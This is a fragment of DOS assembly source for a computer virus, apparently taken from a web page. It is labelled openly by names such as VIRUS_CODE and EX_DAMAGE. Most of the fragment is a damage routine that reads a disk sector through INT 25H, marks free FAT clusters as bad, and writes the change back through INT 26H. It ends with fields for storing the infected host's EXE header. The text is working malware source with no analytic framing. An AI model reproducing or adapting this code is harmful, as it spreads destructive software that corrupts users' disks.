		CMP     DX,00H
		JNE     GET_VER
		CMP     AX,5104H
		JBE     EX_DAMAGE
		
GET_VER:        
		PUSH    BX
		
		MOV     AH,30H
		INT     21H
		
		POP     BX
		
		CMP     AL,04
		JNB     D4_PLUS
		
		XOR     AX,AX
		MOV     AL,[BX+0F]
		JMP     D4_NEG

D4_PLUS:
		mov     ax,[bx+0F]
D4_NEG:
		ADD     AX,[BX+06]
		DEC     AX
		MOV     DX,AX

		MOV     AL,[BX]
TRY_AGAIN:                
		MOV     CX,1H
		MOV     BX,OFFSET CHECK_INF
		PUSH    CS
		POP     DS

		PUSH    AX
		PUSH    DX

		INT     25H
		POPF

		JB      EX_DAMAGE
		
		POP     DX
		POP     AX
		MOV     SI,01FEH
		
		;THIS SHOULD BE ADJUSTED

NEXT_CLUSTER:
		MOV     BX,[SI+0282]
		CMP     BX,00H
		JE      MARK_BAD

		CMP     SI,00
		JE      NEXT1

		DEC     SI
		DEC     SI
		JMP     NEXT_CLUSTER
NEXT1:
		DEC     DX
		CMP     DX,08H
		JE      EX_DAMAGE

		JMP     TRY_AGAIN
MARK_BAD:                       
		MOV     WORD PTR ds:[SI+OFFSET check_inf],0FFF7H
		MOV     CX,1
		MOV     BX,OFFSET check_inf
		INT     26H
		POPF
EX_DAMAGE:
		JMP     EXIT_GOTO_DOS21

COUNTER         DB      2
HOST_LENG       DW      0430h
HOST_LENG1      DW      0h
FILE_INF        DB      50H, 6FH, 6FH, 54H

END_VIRUS       EQU     $


check_inf       db     01, 02, 03, 04               ;282
		

DBUF_1          DW      0                            ;286
HLASTPS         DW      0                            ;288
HLPCOUNT        DW      0                            ;28A
RELOC           DW      0                            ;28c
HEADER          DW      0                            ;28e
MINALLOC        DW      0                            ;290
MAXALLOC        DW      0                            ;292
H_INIT_SS       DW      0                            ;294
H_INIT_SP       DW      0                            ;296
CHECKSUM        DW      0                            ;298
H_INIT_IP       DW      0                            ;29A
H_INIT_CS       DW      0                            ;29C
RELOC_OFF       DW      0                            ;29E
OVER_NUM        DW      0                            ;2A0
			
VIRUS_CODE      ENDS
		END     START

</textarea></td></tr></table></body></html>
